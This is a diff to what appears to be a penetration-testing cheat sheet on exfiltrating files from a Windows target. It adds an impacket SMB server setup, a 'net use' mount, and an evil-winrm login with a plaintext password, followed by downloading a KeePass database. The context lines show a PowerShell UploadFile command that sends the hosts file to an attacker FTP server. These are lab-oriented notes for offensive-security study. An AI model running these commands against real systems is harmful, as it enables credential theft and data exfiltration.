@@ -171,6 +171,14 @@ On the **attacker**'s machine, create a upload server using Python3's `wsgidav` 
 <pre class="language-bash"><code class="lang-bash"><strong>kali@kali $ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
 </strong></code></pre>
 
+> impacket-smbserver would also work
+
+```
+sudo impacket-smbserver a -smb2support . -username a -password a
+```
+
+> if the username and password is specified then run `net use \10.10.14.4\a /user:a a` to mount the folder and then share the file.
+
 On the **target** machine, run
 
 <pre class="language-shell-session"><code class="lang-shell-session"><strong>C:\> dir \\192.168.49.128\DavWWWRoot
@@ -193,6 +201,26 @@ On the **target** machine, run
 ```
 PS C:\> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
 ```
+
+### evil-winrm
+
+connect using evil-winrm normally
+
+```
+evil-winrm -i 10.129.202.222 -u johanna -p 1231234!
+```
+
+After getting a shell type
+
+```
+*Evil-WinRM* PS C:\Users\johanna\Documents> download Logins.kdbx
+```
+
+
+
+
+
+
 
 
 
